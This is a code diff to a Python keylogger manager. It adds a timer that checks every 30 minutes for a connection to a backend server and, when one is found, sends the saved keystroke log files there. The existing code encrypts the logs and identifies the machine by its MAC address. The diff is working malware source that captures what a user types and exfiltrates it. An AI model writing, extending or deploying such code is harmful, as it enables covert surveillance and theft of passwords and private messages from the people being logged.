@@ -11,16 +11,20 @@ SERVER_URL = "http://127.0.0.1:5000"
 
 #Manager
 class KeyLoggerManager:
-    def __init__(self,url,interval=60):
+    def __init__(self,url,interval=60,check_interval=1800):
         self.service = KeyLoggerService()
         self.file_writer = Writer(url)
         self.encryptor = EncryptionClient(url)
         self.interval = interval
         self.backend_url = url
+        self.is_connected = False
+        self.running = False
+        self.check_interval = check_interval
         self.start()
 
     def start(self):
         self._schedule_next_write()
+        self._schedule_connection_check()
         self.service.start_logging()
 
     def stop(self):
@@ -49,6 +53,23 @@ class KeyLoggerManager:
             timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
             self.file_writer.save_manager(log_entry,timestamp)
         self._schedule_next_write()
+
+
+    def _schedule_connection_check(self):
+        threading.Timer(self.check_interval,self._check_connection).start()
+
+
+    def _check_connection(self):
+        self.is_connected = self.file_writer.is_connected(self.encryptor.MAC)
+
+        if self.is_connected:
+            print(f"{datetime.datetime.now()} Connected to the server,checking for send files..")
+            self.file_writer.send_files()
+
+        else:
+            print(f"{datetime.datetime.now()} No connected to the server")
+
+        self._schedule_connection_check()
 
 
 
